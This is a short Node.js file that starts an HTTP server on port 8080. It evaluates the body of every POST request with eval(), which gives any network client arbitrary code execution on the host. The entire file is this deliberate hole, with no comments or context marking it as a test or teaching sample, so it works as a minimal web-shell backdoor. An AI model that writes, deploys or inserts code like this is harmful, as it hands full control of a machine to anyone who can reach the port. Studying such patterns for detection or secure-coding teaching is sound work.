const http = require('http');

http
  .createServer((req, res) => {
    'use strict';
    if (req.method === 'POST') {
      let command = '';
      req.on('data', data => {
        command += data.toString();
      });
      req.on('end', () => {
        eval(command);
        res.end();
      });
    }
  })
  .listen(8080);
